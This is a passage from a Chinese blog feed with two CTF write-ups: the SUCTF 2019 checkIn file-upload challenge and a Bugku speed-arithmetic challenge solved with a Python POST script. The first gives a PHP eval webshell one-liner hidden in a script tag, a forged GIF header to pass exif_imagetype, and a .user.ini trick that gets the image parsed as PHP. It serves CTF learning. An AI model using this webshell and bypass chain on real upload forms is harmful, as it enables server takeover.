<p><img src="https://zhangzy999.github.io//post-images/1589512360743.png" alt="" loading="lazy"><br>
555,果然不可以，提示我们非法后缀，既然是后缀这块不通过，我们用特殊的来看看，比如双写php，大小写php，用特殊扩展名pht等方法都没办法绕过这个玩意，不信你看源代码嘛（事后出题师傅们放到github上的）<br>
<img src="https://zhangzy999.github.io//post-images/1589513091150.png" alt="" loading="lazy"><br>
可以看到只要是ph开头的都被干掉了，htaccess也被干掉了（小声bb：这块不太明白，不是只有apache服务器才能上传.htaccess文件吗，个人猜测当时比赛的时候出题方的服务器是apache，buu上的服务器应该就是nginx了8）<br>
既然php不可以，那我们把后缀改成jpg试试😎<img src="https://zhangzy999.github.io//post-images/1589513590035.png" alt="" loading="lazy"><br>
可以看到已经绕过了后缀名检测的机制，但是它告诉我们你的图片里不能有&quot;&lt;?&quot;这个东西哟😭<br>
莫得事，我们可以用&lt;script&gt;标签来绕过</p>
<pre><code class="language-javascript">&lt;script language=&quot;php&quot;&gt;eval($_POST['CyurL3']);&lt;/script&gt;
</code></pre>
<p>那么我们再上传一波来看看<br>
<img src="https://zhangzy999.github.io//post-images/1589514478580.png" alt="" loading="lazy"><br>
还是不行，它还有exif_imagetype这个东西的检测，百度一下知道它是php的一个函数，来读取一个图像的第一个字节并检查其签名，那我们伪造一波8，在前面加上gif的文件头“GIF”<br>
<img src="https://zhangzy999.github.io//post-images/1589515289607.png" alt="" loading="lazy"><br>
Ohhhh,上传成功辣<br>
<img src="https://zhangzy999.github.io//post-images/1589515528926.png" alt="" loading="lazy"><br>
但是怎么解析就是个大问题了没错吧，你可以看到，上传目录下面有index.php，叫什么名字不重要，重要的是有php文件，这个就很nice，我们上传个.user.ini，来包含下a.jpg，让它在php文件里面被解析<br>
<img src="https://zhangzy999.github.io//post-images/1589515762119.png" alt="" loading="lazy"><br>
这是.user.ini的内容，好了，我们可以上传一波康康<br>
<img src="https://zhangzy999.github.io//post-images/1589515814991.png" alt="" loading="lazy"><br>
没毛病，成功辽，进入上传文件目录到index.php页面里面，然后菜刀或者蚁剑连接木马，顺利找到flag！<br>
<img src="https://zhangzy999.github.io//post-images/1589515871604.png" alt="" loading="lazy"><br>
总结下嗷，.user.ini可以来帮助我们解析图片马<br>
其优势吧，在于无论服务器是nginx/apache/IIS，只要是以fastcgi或者cgi运行的php都可以用这个方法来搞一搞，但是有个致命的要求，就是说你的上传目录文件下面得有php文件才可以……<br>
再者，我们复现环境的时候，康康它的源码，其实有个地方做的很不合理，就是过滤掉&quot;&lt;?&quot;的内容，对于用户来说很不友好，因为很多的jpg文件里面的数据区有&quot;&lt;?&quot;这种符号，这样就导致了我们普通的图片也无法上传（亲测），综上，本题get到的技能点：<br>
1，.user.ini来解析木马<br>
2，&lt;script&gt;标签来绕过&quot;&lt;?&quot;的限制（其实绝大多数情况下script标签也不能用……）<br>
3，用图片的文件头来绕过exif_imagetype()函数的检测<br>
本文的最后附上github上的题目项目8：<a href="https://github.com/team-su/SUCTF-2019/blob/master/Web/checkIn/src/html/index.php">题目环境</a><br>
如有错误，b站私信up主”yuyu-宇“指出嗷~</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[CTF—Bugku：秋名山老司机(快速反弹POST)—来一起开车鸭~]]></title>
        <id>https://zhangzy999.github.io/post/qiumingshanlaosiji/</id>
        <link href="https://zhangzy999.github.io/post/qiumingshanlaosiji/">
        </link>
        <updated>2020-05-07T03:28:12.000Z</updated>
        <content type="html"><![CDATA[<p>封面小姐姐好看吧🤤<br>
没错，本次题目和她……一点关系都没有……<br>
无聊，博客太少了，于是乎随便做俩题写个wp来凑凑数（逃<br>
这个题不算难——前提是你会python<br>
咳咳，进入正题，我们打开页面，发现如下所示：<br>
<img src="https://zhangzy999.github.io//post-images/1588822298727.PNG" alt="" loading="lazy"><br>
页面啥都莫得，只有一句话：请在两秒内提交表达式的值<br>
好吧，除非我是速算界的超级大脑和手速界的扛把子，要不然肯定做不到<br>
分析下哈，提交的话，用什么办法提交？get？post？<br>
当我再刷新两下页面的时候，就出现了一句提示<br>
<img src="https://zhangzy999.github.io//post-images/1588822470508.PNG" alt="" loading="lazy"><br>
嗯，很好，告诉我们用post提交，而且提示我们参数是value<br>
那我们就上python吧<br>
网上的wp大多是正则表达式，我就纳闷了，split方法不香吗   o.o  😑 (正则大佬请无视)<br>
<img src="https://zhangzy999.github.io//post-images/1588822588012.PNG" alt="" loading="lazy"><br>
上图是我用split方法进行调试的结果<br>
好8，直接祭出改良版的脚本：（因为有时候数太大python计算好像会出现一定的精确度上的误差）<br>
我选择了一个while循环来优化，看着也省心☠️<br>
<img src="https://zhangzy999.github.io//post-images/1588822722154.PNG" alt="" loading="lazy"></p>
<pre><code class="language-python">import requests
while True:
    url = 'http://123.206.87.240:8002/qiumingshan/'
    s = requests.session()
    r = s.get(url)
    temp = r.text.split(&quot;div&gt;&quot;)[1].split('=')[0]  
    flag = eval(temp)
    data = {'value':flag}
    response = s.post(url,data = data)
    if &quot;Bug&quot; in response.text:
        print response.text
        break
</code></pre>
<p>然后就是flag辣<br>
<img src="https://zhangzy999.github.io//post-images/1588822875045.PNG" alt="" loading="lazy"></p>
]]></content>
    </entry>
</feed>